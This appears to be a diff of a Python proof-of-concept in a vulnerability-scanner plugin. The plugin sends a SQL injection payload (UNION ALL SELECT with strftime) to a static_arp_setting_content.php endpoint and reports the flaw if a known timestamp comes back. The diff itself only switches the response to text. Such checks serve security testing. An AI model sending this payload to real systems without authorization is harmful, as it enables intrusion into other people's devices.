@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = '/acc/bindipmac/static_arp_setting_content.php?arpName=123%27%20UNION%20ALL%20SELECT%20NULL,strftime(%27%s%27,%272015-11-11%27),NULL,NULL,NULL,NULL,NULL,NULL--'
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            content = req.content
+            content = req.text
 
             if '1447200000' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
